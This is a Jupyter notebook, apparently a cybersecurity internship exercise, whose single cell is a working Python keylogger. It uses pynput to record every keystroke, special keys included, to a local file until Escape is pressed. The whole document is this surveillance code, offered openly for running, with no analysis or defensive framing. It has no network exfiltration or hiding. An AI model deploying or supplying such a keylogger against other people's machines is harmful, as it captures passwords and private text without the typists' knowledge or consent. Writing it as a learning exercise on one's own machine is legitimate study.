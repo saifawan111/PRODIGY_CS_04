{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7ca832e6-282b-40b0-a358-8d2239ede02d",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pynput import keyboard\n",
    "\n",
    "# File to save logged keys\n",
    "LOG_FILE = \"key_log.txt\"\n",
    "\n",
    "def on_press(key):\n",
    "    \"\"\"\n",
    "    Callback function that is called when a key is pressed.\n",
    "    \"\"\"\n",
    "    try:\n",
    "        # Convert key to string and write to log file\n",
    "        with open(LOG_FILE, \"a\") as log_file:\n",
    "            log_file.write(str(key.char))\n",
    "    except AttributeError:\n",
    "        # Handle special keys (e.g., shift, ctrl)\n",
    "        with open(LOG_FILE, \"a\") as log_file:\n",
    "            log_file.write(f'[{key}]')\n",
    "\n",
    "def on_release(key):\n",
    "    \"\"\"\n",
    "    Callback function that is called when a key is released.\n",
    "    \"\"\"\n",
    "    # Stop listener if the escape key is pressed\n",
    "    if key == keyboard.Key.esc:\n",
    "        return False\n",
    "\n",
    "def main():\n",
    "    \"\"\"\n",
    "    Main function to start the keylogger.\n",
    "    \"\"\"\n",
    "    # Create a listener for keyboard events\n",
    "    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:\n",
    "        listener.join()\n",
    "\n",
    "if __name__ == \"__main__\":\n",
    "    main()\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
